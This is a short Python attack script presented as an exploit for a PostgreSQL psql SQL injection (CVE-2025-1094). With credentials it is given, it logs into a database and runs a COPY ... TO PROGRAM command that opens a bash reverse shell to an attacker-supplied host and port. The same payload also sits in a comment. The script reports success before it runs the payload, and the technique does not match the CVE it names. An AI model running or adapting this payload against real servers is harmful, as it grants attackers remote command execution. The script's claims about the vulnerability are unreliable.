#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Originaly made by hackyboiz https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/
# Translated and little fixed by the29a

import argparse
import psycopg2

def banner():
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                                ║
    ║        PostgreSQL psql SQL injection (CVE-2025-1094)           ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)


# PostgreSQL psql SQL injection


def exploit(host, port, dbname, user, password, lhost, lport):
    print(f"[DEBUG] lhost: {repr(lhost)}")
    print(f"[DEBUG] lport: {repr(lport)}")

    # payload = "COPY users TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/your-ip/4444 0>&1\"';"
    payload = f"COPY users TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"';"

    try:
        conn = psycopg2.connect(host=host, port=port, dbname=dbname, user=user, password=password)
        cursor = conn.cursor()
        cursor = conn.cursor()
        print("[+] Connected to PostgreSQL")
        print("[*] Executing payload...")
        print("[✓] Payload executed! Check your netcat listener.")
        cursor.execute(payload)
    except Exception as e:
        print("[-] Exploit failed:", str(e))
    finally:
        if conn:
            cursor.close()
            conn.close()


def main():
    banner()
    
    parser = argparse.ArgumentParser(description="PostgreSQL psql SQL injection (CVE-2025-1094) Exploit")
    parser.add_argument("--host", required=True, help="PostgreSQL Instanse IP")
    parser.add_argument("-p", "--port", required=True, help="PostgreSQL Instanse Port (Default: 5432)")
    parser.add_argument("-d", "--dbname", required=True, help="PostgreSQL Database Name")
    parser.add_argument("-u", "--user", required=True, help="PostgreSQL User")
    parser.add_argument("-s", "--password", dest="password", required=True, help="PostgreSQL User password")
    parser.add_argument("--lhost", required=True, help="Local host for reverse shell")
    parser.add_argument("--lport", required=True, help="Local port for reverse shell")

    args = parser.parse_args()
    
    exploit(args.host, args.port, args.dbname, args.user, args.password, args.lhost, args.lport)

if __name__ == "__main__":
    main()